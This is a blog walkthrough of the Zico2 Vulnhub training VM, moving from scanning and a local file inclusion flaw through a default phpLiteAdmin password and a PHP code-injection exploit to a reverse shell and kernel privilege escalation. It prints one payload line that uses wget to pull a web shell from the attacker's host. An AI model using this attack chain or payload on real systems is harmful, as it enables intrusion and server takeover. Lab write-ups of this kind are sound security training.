---
layout: post
title: Zico2 Vulnhub Walkthrough
tags: pentesting
---
Hey guys

Zico2 is a boot2root vulnerable virtual machine available from https://www.vulnhub.com/entry/zico2-1,210/
It boasts a web-application running on bootstrap+phpliteadmin, but with a couple of enumeration, we can drop down to root pretty easily. 

First, we identify the IP address of the booted VM. I like to use netdiscover.

<img src="{{ site.url }}/images/2017-11-30/recc0.PNG" >

<img src="{{ site.url }}/images/2017-11-30/recc1.PNG" >

192.168.56.5 was the only one ping-able, so we can assume that it is our target (the others are for virtualbox). Your IP address will defer according to your DHCP server settings on your virtualbox/VMware/Hyper-V-thingie

The next step will be to launch a full nmap scan, among with other scans. Sparta is a great tool for the job, launching full nmap, nikto, and even smb/snmp/smtp scans whenever it detects the relevant applications running on the target. Let's launch that, and point it to our target. Hit run, and we should get results soon

<img src="{{ site.url }}/images/2017-11-30/recc2.PNG" >

*side note, Spata appears to be created when one of the authors was Trying Harder at OSCP. 


Sparta's nmap scan pointed out a web-server running (duh), along with other ports that are quite unresponsive. The Nikto scan launched on the default webpage yielded little. However, if we manually explore the website, we will come across a view.php url

<img src="{{ site.url }}/images/2017-11-30/lfi0.PNG" >

<img src="{{ site.url }}/images/2017-11-30/lfi0.1.PNG" >

Launching a Nikto scan manually on THAT gives us something a bit more interesting. Namely, LFI (Local File Inclusion, the ability to read or even execute local files on the target)

<img src="{{ site.url }}/images/2017-11-30/lfi1.png" >

<img src="{{ site.url }}/images/2017-11-30/lfi2.png" >

I couldn't get Remote File Inclusion from LFI, so I took a step back and decided to Dirb the whole site.

<img src="{{ site.url }}/images/2017-11-30/dirb0.PNG" >

<img src="{{ site.url }}/images/2017-11-30/dirb1.PNG" >


dbadmin certainly sounds suspiciously man-made, and sure enough, we find a database administration portal in the form of PhpLiteAdmin 1.9.3 running behind it

<img src="{{ site.url }}/images/2017-11-30/phpLiteAdmin.PNG" >

It even uses the password "password"!

<img src="{{ site.url }}/images/2017-11-30/phpLiteAdmin2.PNG" >

Logging in is great, but what's even better is the Remote Code Execution that follows. A simple search on the exploitdb database (in my case, using the offline searchsploit feature), yielded a few RCEs just for this phpLiteAdmin version
 	
<img src="{{ site.url }}/images/2017-11-30/rce0.PNG" >

Let's follow the steps specified in the 24044 exploit. I created a cmdinj.php database, made a new table, and set a default text to 
{% highlight ruby %}
<?php echo_shell('wget 192.168.56.4/cmd.txt -O /tmp/cmd.php; ls /tmp');?>
{% endhighlight %}

<img src="{{ site.url }}/images/2017-11-30/rce1.PNG" >

<img src="{{ site.url }}/images/2017-11-30/rce2.PNG" >

<img src="{{ site.url }}/images/2017-11-30/rce3.PNG" >

Here's what cmd.txt looks like on my attacker's machine

<img src="{{ site.url }}/images/2017-11-30/rce3.5.PNG" >



Here's when the LFI becomes really useful. Navigating to the /tmp/cmd.php file, we now have a reliable code injection!

<img src="{{ site.url }}/images/2017-11-30/rce4.PNG" >


Upgrading to a shell can be done by using the python rev shell. See http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet for more details and alternatives.
It didn't work until I encoded it to be URL-friendly. I used google to grab one (https://meyerweb.com/eric/tools/dencoder/)

<img src="{{ site.url }}/images/2017-11-30/revshell0.PNG" >

Then, injecting this encoded command into the URL, and we get a reverse shell on our attacker's netcat listener! We get interactive with a python one-liner

<img src="{{ site.url }}/images/2017-11-30/revshell1.PNG" >

<img src="{{ site.url }}/images/2017-11-30/revshell2.PNG" >


Privilege Escalation can be done by exploiting a kernel vulnerability. We first obtain information about the kernel, and with our handy Searchsploit, quickly found one that is useful

<img src="{{ site.url }}/images/2017-11-30/privesc0.PNG" >

<img src="{{ site.url }}/images/2017-11-30/privesc1.PNG" >

We compile it on our attacker's machine, and using a simple python3 server, leverage the limited shell to get it onto our victim's machine

<img src="{{ site.url }}/images/2017-11-30/privesc2.PNG" >

<img src="{{ site.url }}/images/2017-11-30/privesc3.PNG" >

<img src="{{ site.url }}/images/2017-11-30/privesc4.PNG" >

Running it ACCORDING TO THE COMMENTS IN THE CODE nets us root (you can see my blunders)

<img src="{{ site.url }}/images/2017-11-30/privesc5.PNG" >

I truncated the flag, because that's for you to get. 


All in all, not a difficult boot2root. If you enumerate plentifully and plan well, this machine is very doable.

--SeraphimX
